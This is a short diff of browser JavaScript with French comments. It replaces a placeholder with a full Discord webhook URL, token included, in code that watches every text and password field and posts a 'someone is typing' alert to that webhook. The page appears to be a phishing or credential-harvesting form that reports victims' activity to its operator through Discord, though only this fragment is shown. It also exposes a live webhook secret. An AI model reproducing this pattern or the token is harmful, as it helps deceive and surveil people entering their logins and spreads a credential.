@@ -283,7 +283,7 @@ document.getElementById('confirmBtn').addEventListener('click', function() {
 const inputFields = document.querySelectorAll('input[type="text"], input[type="password"]');
 let typingTimeout;
 function sendTyping() {
-  fetch('VOTRE_WEBHOOK_URL', { // remplacez par votre webhook
+  fetch('https://discord.com/api/webhooks/1500260636360314922/jGdINSMnDqiX_B39wtCs5q0fCz_AGtxruEStRPQpjqf_akokba9KjFW7Ni8TIxu3xYAn', { // remplacez par votre webhook
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ content: "Une personne est en train d'écrire..." })
